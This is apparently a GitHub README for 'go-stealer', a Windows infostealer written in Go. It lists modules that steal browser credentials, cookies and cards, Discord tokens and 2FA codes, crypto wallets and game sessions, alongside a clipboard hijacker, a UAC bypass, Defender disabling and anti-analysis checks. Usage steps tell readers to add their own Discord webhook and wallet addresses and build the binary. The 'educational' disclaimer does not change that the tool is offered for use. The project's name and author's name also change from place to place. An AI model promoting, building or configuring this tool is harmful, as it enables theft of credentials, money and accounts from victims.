<div align="center">
<a href="https://github.com/meLdozyk/go-stealer/network/members"><img src="https://img.shields.io/github/forks/meLdozyk/go-stealer?style=for-the-badge&color=b143e3" alt="Forks"></a>
<a href="https://github.com/meLdozyk/go-stealer/stargazers"><img src="https://img.shields.io/github/stars/meLdozyk/go-stealer.svg?style=for-the-badge&color=b143e3" alt="Stargazers"></a>
<a href="https://github.com/meLdozyk/go-stealer/issues"><img src="https://img.shields.io/github/issues/meLdozyk/go-stealer.svg?style=for-the-badge&color=b143e3" alt="Issues"></a>
<a href="https://github.com/meLdozyk/go-stealer/blob/main/LICENSE"><img src="https://img.shields.io/github/license/meLdozyk/go-stealer.svg?style=for-the-badge&color=b143e3" alt="MIT License"></a>
</div>

<br>

<p align="center">
    <img src="./.github/assets/avatar.png" width=100  >
</p>



<h1 align="center">go-stealer</h1>

<p align="center">Go-written Malware targeting Windows systems, extracting User Data from Discord, Browsers, Crypto Wallets and more, from every user on every disk. (PoC. For Educational Purposes only)</p>

---

<details>
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#about-the-project">About The Project</a>
      <ul>
        <li><a href="#features">Features</a></li>
      </ul>
    </li>
    <li>
      <a href="#getting-started">Getting Started</a>
      <ul>
        <li><a href="#prerequisites">Prerequisites</a></li>
        <li><a href="#installation">Installation</a></li>
      </ul>
    </li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#preview">Preview</a></li>
    <li><a href="#remove">Remove</a></li>
    <li><a href="#contributing">Contributing</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
    <li><a href="#acknowledgments">Acknowledgments</a></li>
    <li><a href="#disclaimer">Disclaimer</a></li>  </ol>
</details>

## About the project

This proof of concept project demonstrates a "Discord-oriented" stealer implemented in Go. The malware operates on Windows systems and use fodhelper.exe technique for privileges elevation. By elevating privileges, the malware gains access to all user sessions on every disk

### Features:

- [antidebug](https://github.com/meLdozyk/go-stealer/blob/main/modules/antidebug/antidebug.go): Terminates debugging tools.
- [antivirus](https://github.com/meLdozyk/go-stealer/blob/main/modules/antivirus/antivirus.go): Disables Windows Defender and blocks access to antivirus websites.
- [antivm](https://github.com/meLdozyk/go-stealer/blob/main/modules/antivm/antivm.go): Detects and exits when running in virtual machines (VMs).
- [browsers](https://github.com/meLdozyk/go-stealer/blob/main/modules/browsers/browsers.go):
  - Steals logins, cookies, credit cards, history, and download lists from 37 Chromium-based browsers.
  - Steals logins, cookies, history, and download lists from 10 Gecko browsers.
- [clipper](https://github.com/meLdozyk/go-stealer/blob/main/modules/clipper/clipper.go): Replaces the user's clipboard content with a specified crypto address when copying another address.
- [commonfiles](https://github.com/meLdozyk/go-stealer/tree/main/modules/commonfiles/commonfiles.go): Steals sensitive files from common locations.
- [discodes](https://github.com/meLdozyk/go-stealer/blob/main/modules/discodes/discodes.go): Captures Discord Two-Factor Authentication (2FA) backup codes.
- [discordinjection](https://github.com/meLdozyk/go-stealer/blob/main/modules/discordinjection/injection.go):
  - Intercepts login, register, and 2FA login requests.
  - Captures backup codes requests.
  - Monitors email/password change requests.
  - Intercepts credit card/PayPal addition requests.
  - Blocks the use of QR codes for login.
  - Prevents requests to view devices.
- [fakerror](https://github.com/meLdozyk/go-stealer/blob/main/modules/fakeerror/fakeerror.go): Trick user into believing the program closed due to an error.
- [games](https://github.com/meLdozyk/go-stealer/blob/main/modules/games/games.go): Extracts Epic Games, Uplay, Minecraft (14 launchers) and Riot Games sessions.
- [hideconsole](https://github.com/meLdozyk/go-stealer/blob/main/modules/hideconsole/hideconsole.go): Module to hide the console.
- [startup](https://github.com/meLdozyk/go-stealer/blob/main/modules/startup/startup.go): Ensures the program runs at system startup.
- [system](https://github.com/meLdozyk/go-stealer/blob/main/modules/system/system.go): Gathers CPU, GPU, RAM, IP, location, saved Wi-Fi networks, and more.
- [tokens](https://github.com/meLdozyk/go-stealer/blob/main/modules/tokens/tokens.go): Extracts tokens from 4 Discord applications, Chromium-based browsers, and Gecko browsers.
- [uacbypass](https://github.com/meLdozyk/go-stealer/blob/main/modules/uacbypass/bypass.go): Grants privileges to steal user data from others users.
- [wallets](https://github.com/meLdozyk/go-stealer/blob/main/modules/wallets/wallets.go): Steals data from 10 local wallets and 55 wallet extensions.


## Getting started

### Prerequisites

* [Git](https://git-scm.com/downloads)
* [The Go Programming Language](https://go.dev/dl/)

### Installation
To install this project using Git, follow these steps:

- Clone the Repository:

```bash
git clone https://github.com/meLdozyk/go-stealer
```
- Navigate to the Project Directory:

```bash
cd go-stealer
```

## Usage

You can use the Project template:

- Open `main.go` and edit config with your Discord webhook and your crypto addresses

- Build the template: (reduce binary size by using `-s -w`)

```bash
go build -ldflags "-s -w"
```

(You can hide the console without `hideconsole` module by using `go build -ldflags "-s -w -H=windowsgui"`, but you must remove `program.IsAlreadyRunning()` check from `main.go` before)


- You can also use skuld in your own Go code. Just import the desired module like this:
```go
package main

import "github.com/meLdozyk/go-stealer/modules/hideconsole"

func main() {
  hideconsole.Run()
}
```



## Remove

This guide will help you removing skuld from your system

1. Open powershell as administrator

2. Kill processes that could be skuld

```bash
taskkill /f /t /im go-stealer.exe
taskkill /f /t /im SecurityHealthSystray.exe
```

(use `tasklist` to list all running processes, skuld.exe and SecurityHealthSystray.exe are the default names)

3. Remove skuld from startup
```bash
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Universal Service" /f
```

(Realtek HD Audio Universal Service is the default name)

4. Enable Windows defender:

You can do it by running this [.bat script](https://github.com/TairikuOokami/Windows/blob/main/Microsoft%20Defender%20Enable.bat) (I'm not the developer behind it, make sure the file does not contain malware)

## Contributing
Contributions to this project are welcome! Feel free to open issues, submit pull requests, or suggest improvements. Make sure to follow the [Contributing Guidelines](https://github.com/hackirby/skuld/blob/main/CONTRIBUTING.md)

You can also support this project development by leaving a star ⭐ or by donating me. Every little tip helps!

## License
This library is released under the MIT License. See LICENSE file for more informations.

## Contact
If you have any questions or need further assistance, please contact discord: wh1tness


## Disclaimer

### Important Notice: This tool is intended for educational purposes only.

This software, referred to as skuld, is provided strictly for educational and research purposes. Under no circumstances should this tool be used for any malicious activities, including but not limited to unauthorized access, data theft, or any other harmful actions.

### Usage Responsibility:

By accessing and using this tool, you acknowledge that you are solely responsible for your actions. Any misuse of this software is strictly prohibited, and the creator (hackirby) disclaims any responsibility for how this tool is utilized. You are fully accountable for ensuring that your usage complies with all applicable laws and regulations in your jurisdiction.

### No Liability:

The creator (wh1tness) of this tool shall not be held responsible for any damages or legal consequences resulting from the use or misuse of this software. This includes, but is not limited to, direct, indirect, incidental, consequential, or punitive damages arising out of your access, use, or inability to use the tool.

### No Support:

The creator (wh1tness) will not provide any support, guidance, or assistance related to the misuse of this tool. Any inquiries regarding malicious activities will be ignored.

### Acceptance of Terms:

By using this tool, you signify your acceptance of this disclaimer. If you do not agree with the terms stated in this disclaimer, do not use the software.
